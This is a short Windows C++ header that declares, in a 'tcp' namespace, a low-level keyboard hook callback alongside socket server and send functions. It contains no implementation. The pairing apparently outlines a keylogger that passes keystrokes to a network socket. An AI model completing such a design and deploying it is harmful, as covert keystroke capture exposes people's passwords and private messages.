#ifndef SERVER_H
#define SERVER_H
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>

namespace tcp {
	LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
	void process();
	void serverSend(SOCKET);
	bool server();
}

#endif
